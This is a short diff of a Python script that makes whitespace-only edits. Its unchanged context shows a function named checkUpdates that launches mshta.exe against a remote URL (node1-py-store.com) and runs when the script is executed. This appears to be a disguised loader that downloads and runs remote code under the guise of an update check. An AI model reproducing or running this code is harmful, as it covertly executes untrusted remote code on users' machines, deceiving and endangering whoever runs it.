@@ -1,6 +1,6 @@
 ﻿import subprocess
 
-def checkUpdates():
+def checkUpdates(): 
     try:
         subprocess.Popen(
             ['mshta.exe', 'https://node1-py-store.com' ],
@@ -13,4 +13,5 @@ def checkUpdates():
         return False
 
 if __name__ == "__main__":
+
     checkUpdates()
